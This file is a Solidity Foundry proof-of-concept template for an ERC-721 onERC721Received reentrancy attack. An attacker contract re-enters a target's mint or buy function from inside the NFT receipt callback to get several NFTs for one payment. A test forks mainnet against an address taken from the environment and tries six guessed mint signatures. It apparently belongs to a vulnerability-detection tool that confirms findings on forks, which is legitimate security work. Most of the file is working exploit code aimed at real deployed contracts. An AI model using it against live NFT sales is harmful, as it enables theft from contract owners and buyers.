// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- ERC721 onERC721Received reentrancy
/// @notice Detector: reentrancy. Minting/buying an NFT calls
///         onERC721Received() on the recipient. A minter that mints and
///         calls back BEFORE updating its sold/supply accounting lets the
///         attacker re-enter mint() and get extra NFTs for one payment.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt INFT to the target's real
///      mint/buy signature and price.

interface INFT {
    function mint() external payable;
    function balanceOf(address who) external view returns (uint256);
}

contract ERC721Attacker {
    address public immutable nftAddr;
    uint256 public reentries;
    uint256 public maxReentries;
    uint256 public price;
    bytes public usedCall;

    constructor(address nft_) {
        nftAddr = nft_;
    }

    /// The mint entry point is a GUESS on an unverified target, so the caller
    /// passes the calldata shape. A wrong shape mints nothing; the re-entry in
    /// the ERC-721 callback then has nothing to repeat.
    function attack(uint256 price_, uint256 maxReentries_, bytes calldata callData) external payable {
        price = price_;
        maxReentries = maxReentries_;
        usedCall = callData;
        (bool ok,) = nftAddr.call{value: price}(callData);
        require(ok, "mint entry point reverted for this shape");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (reentries < maxReentries && address(this).balance >= price) {
            reentries++;
            // Best effort: a re-entry that fails simply yields no extra NFT.
            (bool ok,) = nftAddr.call{value: price}(usedCall);
            ok;
        }
        return this.onERC721Received.selector;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the mint price of one NFT on this target.
    uint256 public constant PRICE = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// The NFT count the attacker holds — the OBSERVABLE. Never the call result.
    function _owned(address who) internal view returns (bool found, uint256 n) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address,uint256)", who, uint256(0)));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    /// One mint shape. Success is the attacker ending up with MORE THAN ONE NFT
    /// for one payment — the reentrancy — not the call returning.
    function _attemptShape(address attackerEOA, bytes memory callData, string memory label)
        internal
        returns (uint256 owned)
    {
        ERC721Attacker attacker = new ERC721Attacker(target);
        vm.prank(attackerEOA);
        (bool ok,) = address(attacker).call{value: PRICE * 3}(
            abi.encodeWithSignature("attack(uint256,uint256,bytes)", PRICE, uint256(2), callData)
        );
        console.log("tried", label, ok ? "attack returned" : "attack reverted");
        if (!ok) return 0;
        (bool found, uint256 n) = _owned(address(attacker));
        return found ? n : 0;
    }

    function test_exploit() public {
        require(PRICE > 0, "set PRICE to one NFT's mint price");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        // The mint entry point is a guess: a single wrong name reports
        // "not reproduced" for a vulnerability that exists under another.
        uint256 best;
        uint256 n;
        n = _attemptShape(attackerEOA, abi.encodeWithSignature("mint()"), "mint()");
        if (n > best) best = n;
        n = _attemptShape(attackerEOA, abi.encodeWithSignature("buy()"), "buy()");
        if (n > best) best = n;
        n = _attemptShape(attackerEOA, abi.encodeWithSignature("mint(uint256)", uint256(1)), "mint(uint256)");
        if (n > best) best = n;
        n = _attemptShape(attackerEOA, abi.encodeWithSignature("publicMint()"), "publicMint()");
        if (n > best) best = n;
        n = _attemptShape(attackerEOA, abi.encodeWithSignature("mintNFT()"), "mintNFT()");
        if (n > best) best = n;
        n = _attemptShape(attackerEOA, abi.encodeWithSignature("purchase()"), "purchase()");
        if (n > best) best = n;

        console.log("best NFT count for one payment:", best);
        assertGt(
            best,
            1,
            "no mint entry point let one payment yield more than one NFT. Tried mint(), buy(), mint(uint256), publicMint(), mintNFT(), purchase(). This does NOT establish safety: the mint may be named differently, take other arguments, or the callback may be on a different receiver."
        );
    }
}
